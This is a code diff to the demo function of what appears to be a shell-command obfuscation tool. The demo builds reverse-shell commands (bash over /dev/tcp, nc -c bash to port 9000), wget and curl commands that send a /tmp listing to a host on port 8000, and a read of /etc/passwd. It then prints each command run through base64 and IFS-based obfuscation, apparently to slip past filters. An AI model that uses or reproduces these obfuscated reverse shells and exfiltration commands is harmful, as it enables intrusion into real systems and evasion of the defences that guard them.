@@ -405,18 +405,26 @@ def demo():
 
     ip = get_ip()
 
-    wget_cmd = f"bash -c 'wget http://{ip}:8000/ --method=POST --body-data=$(printf %s.. $(ls /tmp))'"
+    cat_passwd = "cat /etc/passwd"
 
+    wget_cmd = f"bash -c 'wget http://{ip}:8000/ --method=POST --body-data=$(printf %s.. $(ls /tmp))'"
     curl_cmd = f"bash -c 'curl -d $(printf %s.. $(ls /tmp)) http://{ip}:8000/'"
 
     bash_i = f"bash -i >& /dev/tcp/{ip}/9000 0>&1"
-    nc_e = f"nc {ip} 9000 -e bash"
-    cmds = [bash_i, nc_e, wget_cmd, curl_cmd]
+    nc_e = f"nc -c bash {ip} 9000"
+
+
+    cmds = [cat_passwd, bash_i, nc_e, wget_cmd, curl_cmd]
 
     for cmd in cmds:
         print(cmd)
         print(f"[random_obf]\n{random_obf(cmd)}")
         obfs = ['base64', 'bash_c_ifs1']
+        print(
+            f"[apply_obfs({obfs})]\n"
+            f"{apply_obfs(cmd, obfs)}"
+        )
+        obfs = ['bash_c_ifs1']
         print(
             f"[apply_obfs({obfs})]\n"
             f"{apply_obfs(cmd, obfs)}"
